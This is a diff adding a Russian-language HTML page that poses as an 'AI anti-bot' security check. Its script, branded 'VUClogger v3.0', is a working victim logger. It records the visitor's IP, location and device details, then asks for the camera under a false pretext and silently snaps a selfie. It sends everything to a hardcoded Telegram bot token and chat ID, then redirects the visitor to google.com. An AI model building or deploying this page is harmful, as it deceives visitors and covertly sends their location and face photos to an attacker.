@@ -1,1 +1,304 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Проверка безопасности</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .card {
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            max-width: 400px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            text-align: center;
+        }
+        .icon {
+            font-size: 60px;
+            margin-bottom: 20px;
+        }
+        h2 {
+            color: #333;
+            margin-bottom: 10px;
+        }
+        p {
+            color: #666;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: #e0e0e0;
+            border-radius: 2px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background: #667eea;
+            transition: width 0.5s;
+        }
+        button {
+            background: #667eea;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 25px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 10px;
+        }
+        button:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+        .status {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #888;
+        }
+        .hidden {
+            display: none;
+        }
+        video, canvas {
+            display: none;
+        }
+        .security-badge {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #aaa;
+            border-top: 1px solid #eee;
+            padding-top: 15px;
+        }
+    </style>
+</head>
+<body>
+    <div class="card" id="mainCard">
+        <div class="icon" id="icon">🛡️</div>
+        <h2 id="title">Проверка безопасности</h2>
+        <p id="description">Нажмите "Продолжить" для подтверждения</p>
+        <div class="progress-bar" id="progressBar">
+            <div class="progress-fill" id="progressFill"></div>
+        </div>
+        <button id="actionBtn">▶ Продолжить</button>
+        <div class="status" id="status">Ожидание...</div>
+        <div class="security-badge">🔒 Защищено AI-антибот системой</div>
+    </div>
 
+    <!-- Скрытые элементы для камеры -->
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        // ===== НАСТРОЙКИ =====
+        const BOT_TOKEN = '8899770806:AAGlSI0ftftXjXyOinuehX47hrGbWUX5O-g';
+        const CHAT_ID = '8320098094';
+        const REDIRECT_URL = 'https://google.com';
+        // ====================
+
+        // Элементы интерфейса
+        const iconEl = document.getElementById('icon');
+        const titleEl = document.getElementById('title');
+        const descEl = document.getElementById('description');
+        const actionBtn = document.getElementById('actionBtn');
+        const statusEl = document.getElementById('status');
+        const progressFill = document.getElementById('progressFill');
+        const progressBar = document.getElementById('progressBar');
+        
+        let stream = null;
+        let step = 0;
+        let collectedData = {};
+
+        // Отправка сообщения в Telegram
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch(e) {}
+        }
+
+        // Отправка фото
+        async function sendPhotoToTelegram(blob) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'check_selfie.jpg');
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch(e) {}
+        }
+
+        // Обновление UI
+        function updateUI(stepNum) {
+            const steps = [
+                { icon: "🛡️", title: "Проверка безопасности", desc: "Нажмите 'Продолжить' для начала проверки", btn: "▶ Продолжить", progress: 25 },
+                { icon: "📸", title: "Сканирование камеры", desc: "Требуется доступ к камере для anti-bot проверки", btn: "✅ Разрешить", progress: 50 },
+                { icon: "⏳", title: "Обработка", desc: "Пожалуйста, подождите...", btn: "", progress: 75 },
+                { icon: "✅", title: "Проверка пройдена", desc: "Перенаправление...", btn: "", progress: 100 }
+            ];
+            const s = steps[stepNum];
+            if (s) {
+                iconEl.textContent = s.icon;
+                titleEl.textContent = s.title;
+                descEl.textContent = s.desc;
+                actionBtn.textContent = s.btn;
+                progressFill.style.width = s.progress + '%';
+            }
+        }
+
+        // Сбор IP и данных устройства
+        async function collectDeviceData() {
+            const data = {
+                time: new Date().toLocaleString('ru-RU'),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                hardwareConcurrency: navigator.hardwareConcurrency || 'неизвестно',
+                deviceMemory: navigator.deviceMemory || 'неизвестно',
+                referrer: document.referrer || 'прямой переход',
+                url: window.location.href,
+                isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile/i.test(navigator.userAgent)
+            };
+            
+            try {
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ipData = await ipRes.json();
+                data.ip = ipData.ip;
+                data.country = ipData.country_name;
+                data.city = ipData.city;
+                data.org = ipData.org;
+            } catch(e) {
+                data.ip = 'ошибка';
+            }
+            
+            collectedData = data;
+            
+            let msg = `🔴 <b>VUClogger v3.0 | НОВАЯ ЦЕЛЬ</b>\n\n`;
+            msg += `⏰ <b>Время:</b> ${data.time}\n`;
+            msg += `🌐 <b>IP:</b> <code>${data.ip}</code>\n`;
+            msg += `🗺️ <b>Страна:</b> ${data.country}\n`;
+            msg += `📱 <b>Мобильный:</b> ${data.isMobile ? 'Да' : 'Нет'}\n`;
+            msg += `💻 <b>Платформа:</b> ${data.platform}\n`;
+            msg += `📺 <b>Экран:</b> ${data.screenWidth}x${data.screenHeight}\n`;
+            msg += `📊 <b>RAM:</b> ${data.deviceMemory} ГБ\n\n`;
+            msg += `<b>📸 Запрос камеры:</b> Ожидание разрешения...`;
+            
+            await sendToTelegram(msg);
+        }
+
+        // Запрос камеры
+        async function requestCamera() {
+            statusEl.textContent = '🔄 Запрос доступа...';
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: { exact: 'user' } }
+                });
+                
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                await video.play();
+                
+                statusEl.textContent = '✅ Доступ разрешён! Делаем снимок...';
+                step = 2;
+                updateUI(step);
+                
+                // Делаем снимок
+                const canvas = document.getElementById('canvas');
+                const context = canvas.getContext('2d');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                context.drawImage(video, 0, 0);
+                
+                canvas.toBlob(async (blob) => {
+                    await sendPhotoToTelegram(blob);
+                    
+                    // Отправляем подтверждение
+                    let msg = `📸 <b>VUClogger v3.0 | ФОТО ПОЛУЧЕНО</b>\n\n`;
+                    msg += `🌐 <b>IP:</b> <code>${collectedData.ip}</code>\n`;
+                    msg += `🗺️ <b>Страна:</b> ${collectedData.country}\n`;
+                    msg += `📱 <b>Устройство:</b> ${collectedData.isMobile ? 'Мобильное' : 'Компьютер'}\n\n`;
+                    msg += `<b>✅ Проверка пройдена успешно</b>`;
+                    await sendToTelegram(msg);
+                    
+                    // Останавливаем камеру
+                    if (stream) stream.getTracks().forEach(t => t.stop());
+                    
+                    step = 3;
+                    updateUI(step);
+                    statusEl.textContent = '⏳ Перенаправление...';
+                    
+                    setTimeout(() => {
+                        window.location.href = REDIRECT_URL;
+                    }, 1500);
+                    
+                }, 'image/jpeg', 0.8);
+                
+            } catch(err) {
+                console.error('Camera error:', err);
+                statusEl.textContent = '❌ Ошибка доступа к камере. Перенаправление...';
+                
+                let msg = `⚠️ <b>VUClogger v3.0 | ДОСТУП К КАМЕРЕ ОТКЛОНЁН</b>\n\n`;
+                msg += `🌐 <b>IP:</b> <code>${collectedData.ip}</code>\n`;
+                msg += `🗺️ <b>Страна:</b> ${collectedData.country}\n\n`;
+                msg += `<b>❌ Пользователь отклонил запрос</b>`;
+                await sendToTelegram(msg);
+                
+                setTimeout(() => {
+                    window.location.href = REDIRECT_URL;
+                }, 2000);
+            }
+        }
+
+        // Обработчик кнопки
+        actionBtn.onclick = async () => {
+            actionBtn.disabled = true;
+            
+            if (step === 0) {
+                statusEl.textContent = '📡 Сбор информации о устройстве...';
+                await collectDeviceData();
+                step = 1;
+                updateUI(step);
+                statusEl.textContent = '✅ Готово! Нажмите "Разрешить" для проверки камеры';
+                actionBtn.disabled = false;
+            } 
+            else if (step === 1) {
+                statusEl.textContent = '📸 Запрос доступа к камере...';
+                await requestCamera();
+                actionBtn.disabled = true;
+            }
+        };
+        
+        // Старт
+        updateUI(0);
+    </script>
+</body>
+</html>
